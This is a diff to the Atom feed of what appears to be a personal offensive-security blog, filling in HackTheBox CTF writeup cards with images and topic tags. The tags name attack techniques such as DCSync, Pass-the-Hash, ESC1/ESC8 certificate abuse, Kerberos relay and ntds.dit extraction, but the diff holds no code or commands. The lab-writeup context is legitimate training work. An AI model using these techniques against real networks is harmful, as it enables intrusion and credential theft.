@@ -5,7 +5,7 @@
   <subtitle>Offensive Security Researcher · Malware Developer &amp; Analyst · Exploit Developer · CTF Player</subtitle>
   <link href="http://localhost:4000/atom.xml" rel="self"/>
   <link href="http://localhost:4000/"/>
-  <updated>2026-05-15T03:27:00+02:00</updated>
+  <updated>2026-06-09T13:37:03+02:00</updated>
   <id>http://localhost:4000/</id>
   <author>
     <name>tralsesec</name>
@@ -29,7 +29,7 @@
     <title>CTF Writeups</title>
     
     <link href="http://localhost:4000/ctfs/"/>
-    <updated>2026-05-15T03:27:00+02:00</updated>
+    <updated>2026-06-09T13:37:03+02:00</updated>
     <id>http://localhost:4000/ctfs/</id>
 
     
@@ -48,7 +48,7 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
 &lt;div class=&quot;ctf-card&quot; style=&quot;border: 1px solid var(--border); margin-bottom: 2.5rem; background: #0a0a0a; position: relative; overflow: hidden; display: flex; flex-direction: column;&quot;&gt;
   
   &lt;div style=&quot;width: 100%; height: 180px; overflow: hidden; border-bottom: 1px solid var(--border); background: #111;&quot;&gt;
-    &lt;a href=&quot;/ctfs/htb-snoopy/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;&lt;img src=&quot;&quot; alt=&quot;HackTheBox: Snoopy&quot; style=&quot;width: 100%; height: 100%; object-fit: cover; opacity: 0.6;&quot; /&gt;&lt;/a&gt;
+    &lt;a href=&quot;/ctfs/htb-snoopy/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;&lt;img src=&quot;/assets/img/ctf/snoopy.png&quot; alt=&quot;HackTheBox: Snoopy&quot; style=&quot;width: 100%; height: 100%; object-fit: cover; opacity: 0.6;&quot; /&gt;&lt;/a&gt;
   &lt;/div&gt;
 
   &lt;div style=&quot;padding: 1.5rem;&quot;&gt;
@@ -77,11 +77,59 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
     &lt;/div&gt;
 
     &lt;div style=&quot;font-size: 0.9rem; line-height: 1.6; margin-bottom: 1.5rem;&quot;&gt;
-      Coming soon.
+      🎯 Snoopy
 
     &lt;/div&gt;
 
     &lt;div style=&quot;display: flex; flex-wrap: wrap; gap: 8px;&quot;&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Linux
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #LFI
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #DNS
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Zone-Transfer
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #DNS-Zone-Hijack
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #SMTP
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Mailserver
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #SSH-Honeypot
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Credential-Capturing
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #MitM
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #CVE-2023-23946
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #CVE-2023-20052
+      &lt;/span&gt;
       
     &lt;/div&gt;
 
@@ -144,7 +192,7 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
 &lt;div class=&quot;ctf-card&quot; style=&quot;border: 1px solid var(--border); margin-bottom: 2.5rem; background: #0a0a0a; position: relative; overflow: hidden; display: flex; flex-direction: column;&quot;&gt;
   
   &lt;div style=&quot;width: 100%; height: 180px; overflow: hidden; border-bottom: 1px solid var(--border); background: #111;&quot;&gt;
-    &lt;a href=&quot;/ctfs/htb-redelegate/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;&lt;img src=&quot;&quot; alt=&quot;HackTheBox: Redelegate&quot; style=&quot;width: 100%; height: 100%; object-fit: cover; opacity: 0.6;&quot; /&gt;&lt;/a&gt;
+    &lt;a href=&quot;/ctfs/htb-redelegate/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;&lt;img src=&quot;/assets/img/ctf/redelegate.png&quot; alt=&quot;HackTheBox: Redelegate&quot; style=&quot;width: 100%; height: 100%; object-fit: cover; opacity: 0.6;&quot; /&gt;&lt;/a&gt;
   &lt;/div&gt;
 
   &lt;div style=&quot;padding: 1.5rem;&quot;&gt;
@@ -173,11 +221,103 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
     &lt;/div&gt;
 
     &lt;div style=&quot;font-size: 0.9rem; line-height: 1.6; margin-bottom: 1.5rem;&quot;&gt;
-      Coming soon.
+      🎯 Redelegate
 
     &lt;/div&gt;
 
     &lt;div style=&quot;display: flex; flex-wrap: wrap; gap: 8px;&quot;&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Windows
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Active-Directory
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Kerberos
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Keepass
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #FTP
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Weak-Passwords
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #MSSQL
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Password-Spray
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #ForceChangePassword
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #GenericAll
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #SeEnableDelegationPrivilege
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #SeMachineAccountPrivilege
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Constrained-Delegation
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #MachineAccountQuota
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Protocol-Transition
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #msDS-AllowedToDelegateTo
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Delegation
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #S4U
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #S4U2Self
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #S4U2Proxy
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #DCSync
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Pass-The-Hash
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #ACL-Abuse
+      &lt;/span&gt;
       
     &lt;/div&gt;
 
@@ -192,7 +332,7 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
 &lt;div class=&quot;ctf-card&quot; style=&quot;border: 1px solid var(--border); margin-bottom: 2.5rem; background: #0a0a0a; position: relative; overflow: hidden; display: flex; flex-direction: column;&quot;&gt;
   
   &lt;div style=&quot;width: 100%; height: 180px; overflow: hidden; border-bottom: 1px solid var(--border); background: #111;&quot;&gt;
-    &lt;a href=&quot;/ctfs/htb-craft/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;&lt;img src=&quot;&quot; alt=&quot;HackTheBox: Craft&quot; style=&quot;width: 100%; height: 100%; object-fit: cover; opacity: 0.6;&quot; /&gt;&lt;/a&gt;
+    &lt;a href=&quot;/ctfs/htb-craft/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;&lt;img src=&quot;/assets/img/ctf/craft.png&quot; alt=&quot;HackTheBox: Craft&quot; style=&quot;width: 100%; height: 100%; object-fit: cover; opacity: 0.6;&quot; /&gt;&lt;/a&gt;
   &lt;/div&gt;
 
   &lt;div style=&quot;padding: 1.5rem;&quot;&gt;
@@ -221,11 +361,47 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
     &lt;/div&gt;
 
     &lt;div style=&quot;font-size: 0.9rem; line-height: 1.6; margin-bottom: 1.5rem;&quot;&gt;
-      Coming soon.
+      🎯 Craft
 
     &lt;/div&gt;
 
     &lt;div style=&quot;display: flex; flex-wrap: wrap; gap: 8px;&quot;&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Linux
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Virtual-Host
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Gogs
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Git
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Commit-History
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #RCE
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #MySQL
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Vault
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #HashiCorp-Vault
+      &lt;/span&gt;
       
     &lt;/div&gt;
 
@@ -240,7 +416,7 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
 &lt;div class=&quot;ctf-card&quot; style=&quot;border: 1px solid var(--border); margin-bottom: 2.5rem; background: #0a0a0a; position: relative; overflow: hidden; display: flex; flex-direction: column;&quot;&gt;
   
   &lt;div style=&quot;width: 100%; height: 180px; overflow: hidden; border-bottom: 1px solid var(--border); background: #111;&quot;&gt;
-    &lt;a href=&quot;/ctfs/htb-authority/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;&lt;img src=&quot;&quot; alt=&quot;HackTheBox: Authority&quot; style=&quot;width: 100%; height: 100%; object-fit: cover; opacity: 0.6;&quot; /&gt;&lt;/a&gt;
+    &lt;a href=&quot;/ctfs/htb-authority/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;&lt;img src=&quot;/assets/img/ctf/authority.png&quot; alt=&quot;HackTheBox: Authority&quot; style=&quot;width: 100%; height: 100%; object-fit: cover; opacity: 0.6;&quot; /&gt;&lt;/a&gt;
   &lt;/div&gt;
 
   &lt;div style=&quot;padding: 1.5rem;&quot;&gt;
@@ -269,11 +445,63 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
     &lt;/div&gt;
 
     &lt;div style=&quot;font-size: 0.9rem; line-height: 1.6; margin-bottom: 1.5rem;&quot;&gt;
-      Coming soon.
+      🎯 Authority
 
     &lt;/div&gt;
 
     &lt;div style=&quot;display: flex; flex-wrap: wrap; gap: 8px;&quot;&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Windows
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Active-Directory
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Kerberos
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Ansible
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Ansible-Vault
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #PWM
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Configuration-Editor
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #LDAP-Interception
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #ESC1
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #PKINIT
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Schannel
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #RBCD
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #S4U2Proxy
+      &lt;/span&gt;
       
     &lt;/div&gt;
 
@@ -288,7 +516,7 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
 &lt;div class=&quot;ctf-card&quot; style=&quot;border: 1px solid var(--border); margin-bottom: 2.5rem; background: #0a0a0a; position: relative; overflow: hidden; display: flex; flex-direction: column;&quot;&gt;
   
   &lt;div style=&quot;width: 100%; height: 180px; overflow: hidden; border-bottom: 1px solid var(--border); background: #111;&quot;&gt;
-    &lt;a href=&quot;/ctfs/htb-vulncicada/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;&lt;img src=&quot;&quot; alt=&quot;HackTheBox: VulnCicada&quot; style=&quot;width: 100%; height: 100%; object-fit: cover; opacity: 0.6;&quot; /&gt;&lt;/a&gt;
+    &lt;a href=&quot;/ctfs/htb-vulncicada/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;&lt;img src=&quot;/assets/img/ctf/vulncicada.png&quot; alt=&quot;HackTheBox: VulnCicada&quot; style=&quot;width: 100%; height: 100%; object-fit: cover; opacity: 0.6;&quot; /&gt;&lt;/a&gt;
   &lt;/div&gt;
 
   &lt;div style=&quot;padding: 1.5rem;&quot;&gt;
@@ -317,11 +545,63 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
     &lt;/div&gt;
 
     &lt;div style=&quot;font-size: 0.9rem; line-height: 1.6; margin-bottom: 1.5rem;&quot;&gt;
-      Coming soon.
+      🎯 VulnCicada
 
     &lt;/div&gt;
 
     &lt;div style=&quot;display: flex; flex-wrap: wrap; gap: 8px;&quot;&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Windows
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Active-Directory
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Kerberos
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Relay
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #DNS-Spoofing
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Kerberos-Relay
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #NFS
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #ADCS
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Coercion
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #DCSync
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Overpass-the-Hash
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #ESC8
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Web-Enrollment
+      &lt;/span&gt;
       
     &lt;/div&gt;
 
@@ -336,7 +616,7 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
 &lt;div class=&quot;ctf-card&quot; style=&quot;border: 1px solid var(--border); margin-bottom: 2.5rem; background: #0a0a0a; position: relative; overflow: hidden; display: flex; flex-direction: column;&quot;&gt;
   
   &lt;div style=&quot;width: 100%; height: 180px; overflow: hidden; border-bottom: 1px solid var(--border); background: #111;&quot;&gt;
-    &lt;a href=&quot;/ctfs/htb-voleur/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;&lt;img src=&quot;&quot; alt=&quot;HackTheBox: Voleur&quot; style=&quot;width: 100%; height: 100%; object-fit: cover; opacity: 0.6;&quot; /&gt;&lt;/a&gt;
+    &lt;a href=&quot;/ctfs/htb-voleur/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;&lt;img src=&quot;/assets/img/ctf/voleur.png&quot; alt=&quot;HackTheBox: Voleur&quot; style=&quot;width: 100%; height: 100%; object-fit: cover; opacity: 0.6;&quot; /&gt;&lt;/a&gt;
   &lt;/div&gt;
 
   &lt;div style=&quot;padding: 1.5rem;&quot;&gt;
@@ -365,11 +645,63 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
     &lt;/div&gt;
 
     &lt;div style=&quot;font-size: 0.9rem; line-height: 1.6; margin-bottom: 1.5rem;&quot;&gt;
-      Coming soon.
+      🎯 Voleur
 
     &lt;/div&gt;
 
     &lt;div style=&quot;display: flex; flex-wrap: wrap; gap: 8px;&quot;&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Windows
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Active-Directory
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Kerberos
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Restore-Users
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Restore-ADObject
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #ACL-Abuse
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Targeted-Kerberoasting
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #DPAPI-Abuse
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Backup-Service
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Registry-Hive
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #ntds.dit
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #SYSTEM-Hive
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #SECURITY-Hive
+      &lt;/span&gt;
       
     &lt;/div&gt;
 
@@ -520,6 +852,18 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
       &lt;/span&gt;
       
       &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #GenericAll
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #ForceChangePassword
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #FTP
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
         #ACL-Abuse
       &lt;/span&gt;
       
@@ -532,7 +876,7 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
       &lt;/span&gt;
       
       &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
-        #Targeted-Kerberoast
+        #Targeted-Kerberoasting
       &lt;/span&gt;
       
       &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
@@ -892,6 +1236,14 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
       &lt;/span&gt;
       
       &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Groovy
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Token-Impersonation
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
         #SeImpersonatePrivilege
       &lt;/span&gt;
       
